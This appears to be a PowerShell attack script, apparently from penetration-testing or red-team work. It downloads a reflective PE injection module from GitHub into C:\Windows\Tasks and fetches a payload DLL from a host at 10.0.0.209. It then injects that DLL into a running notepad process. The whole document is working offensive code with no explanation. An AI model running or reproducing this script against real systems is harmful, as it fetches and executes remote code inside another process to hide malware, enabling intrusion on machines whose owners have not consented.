(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lyethar/Reflective-PE-Injection/main/Invoke-PEInjection.ps1', 'C:\Windows\Tasks\Invoke-ReflectivePEInjection.ps1')
$bytes = (New-Object System.Net.WebClient).DownloadData('http://10.0.0.209/payload.dll')
$procName = "notepad"
$localByName = Get-Process -Name $procName
$procid = $localByName[0].Id
Import-Module 'C:\Windows\Tasks\Invoke-ReflectivePEInjection.ps1'
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
